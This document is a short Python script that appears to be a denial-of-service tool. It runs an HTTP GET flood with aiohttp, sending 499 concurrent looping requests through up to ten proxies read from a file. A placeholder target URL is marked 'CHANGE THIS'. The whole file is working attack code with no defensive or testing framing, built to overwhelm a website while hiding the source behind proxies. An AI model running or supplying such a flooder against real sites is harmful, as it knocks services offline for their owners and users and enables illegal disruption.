import asyncio
import aiohttp
import sys
import signal

TARGET_URL = "https://example.com"  # CHANGE THIS
PROXY_FILE = "proxies.txt"
CONCURRENT = 499

running = True
proxy_list = []

def load_proxies():
    global proxy_list
    try:
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        # Use first 10 proxies only
        proxy_list = list(dict.fromkeys(proxy_list))[:10]
    except:
        proxy_list = []

async def flood_task(session, proxy):
    while running:
        try:
            async with session.get(TARGET_URL, proxy=proxy, timeout=2) as resp:
                await resp.read()
        except:
            pass
        await asyncio.sleep(0.001)

async def main_flood():
    load_proxies()
    if not proxy_list:
        return
    
    connector = aiohttp.TCPConnector(limit=0, force_close=True, enable_cleanup_closed=True)
    
    # Create sessions for each proxy
    sessions = []
    for proxy in proxy_list:
        session = aiohttp.ClientSession(connector=connector)
        sessions.append((session, proxy))
    
    # Distribute CONCURRENT tasks across proxies
    total_tasks = CONCURRENT
    tasks_per_proxy = total_tasks // len(sessions)
    remainder = total_tasks % len(sessions)
    
    all_tasks = []
    task_idx = 0
    
    for session, proxy in sessions:
        tasks_for_this_proxy = tasks_per_proxy + (1 if remainder > 0 else 0)
        if remainder > 0:
            remainder -= 1
        
        for _ in range(tasks_for_this_proxy):
            if task_idx >= total_tasks:
                break
            task = asyncio.create_task(flood_task(session, proxy))
            all_tasks.append(task)
            task_idx += 1
    
    # Keep alive
    try:
        while running:
            await asyncio.sleep(0.1)
    finally:
        # Cleanup
        for task in all_tasks:
            task.cancel()
        await asyncio.gather(*all_tasks, return_exceptions=True)
        for session, _ in sessions:
            await session.close()

def signal_handler(sig, frame):
    global running
    running = False

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    asyncio.run(main_flood())
